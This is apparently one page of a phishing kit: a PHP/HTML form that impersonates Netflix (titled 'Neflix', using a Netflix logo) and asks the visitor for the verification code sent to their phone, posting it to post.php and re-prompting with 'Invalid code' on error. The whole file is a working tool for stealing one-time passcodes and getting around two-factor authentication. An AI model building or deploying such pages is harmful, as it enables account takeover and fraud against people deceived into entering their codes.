<?php 
require 'main.php';
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="res/netflixc.css">
    <title>Neflix</title>
</head>
<body>
<header>
   <div class="logo">
           <img src="res/img/Logo.png">  </div>
       </header> 

    
    

<main>


<div class="form">
    <div class="continer">
    
<form action="post.php" method="post">
<h1>Confirmation</h1>

<div class="col2"><h4 style="font-weight:normal;">Please enter the verification code sent to your phone.</h4> </div>

<div class="coll">
<input type="text" placeholder="Enter code" name="otp" required> <br> 
<?php 

if(isset($_GET['error'])){
    echo '<input type="hidden" name="exit">';
    echo '<p style="color:red;">Invalid code</p>';
}
?>

<div class="but1">
    <button type="submit">Confirm</button>
</div>

</div> <br>




</form>

</div>
</div>



</main>
</body>
</html>